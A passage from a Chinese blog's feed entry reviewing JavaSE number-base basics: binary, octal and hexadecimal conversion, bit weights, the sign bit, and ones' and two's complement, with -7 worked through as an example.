余数列表的从下到上</p></blockquote><h4 id="2、8互转与2、16互转方法："><a href="#2、8互转与2、16互转方法：" class="headerlink" title="2、8互转与2、16互转方法："></a>2、8互转与2、16互转方法：</h4><blockquote><ul><li>2转8 = 3位一组转8<ul><li>8转2 = 每一位转2</li></ul></li><li>2转16 = 4位一组转16    <ul><li>16转2 = 每一位转2</li></ul></li></ul></blockquote><h4 id="二进制快速转换10进制方法："><a href="#二进制快速转换10进制方法：" class="headerlink" title="二进制快速转换10进制方法："></a>二进制快速转换10进制方法：</h4><blockquote><ul><li>二进制：<code>1    1    1    1    1    1    1    1</code></li><li>十进制：<code>128    64    32    16    8    4    2    1</code></li></ul></blockquote><h4 id="二进制表示法"><a href="#二进制表示法" class="headerlink" title="二进制表示法:"></a>二进制表示法:</h4><blockquote><p>符号位0为正，1为负</p></blockquote><h4 id="计算机二进制运算原理"><a href="#计算机二进制运算原理" class="headerlink" title="计算机二进制运算原理"></a>计算机二进制运算原理</h4><blockquote><p>计算机二进制运算都是用补码</p></blockquote><ul><li><p>例子：</p><blockquote><p>+7 的原码是 0 0000111</p></blockquote></li><li><p>ps：正数的、原码、反码、补码都一样</p></li></ul><blockquote><p>-7 的原码为 1 0000111</p><p>反码为 1 1111000 （符号位不变）</p><p>补码为 1 1111001（在反码的基础上加1）</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;进制的运算&quot;&gt;&lt;a href=&quot;#进制的运算&quot; class=&quot;headerlink&quot; title=&quot;进制的运算&quot;&gt;&lt;/a&gt;进制的运算&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;二进制向右移动两位 ：15 &amp;gt;&amp;gt; 2 = 3&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ps：1111
      
    
    </summary>
    
      <category term="JavaSE 复习" scheme="http://liuhaoan.github.io/categories/JavaSE-%E5%A4%8D%E4%B9%A0/"/>
    
    
      <category term="进制编码" scheme="http://liuhaoan.github.io/tags/%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81/"/>
    
  </entry>
  
</feed>
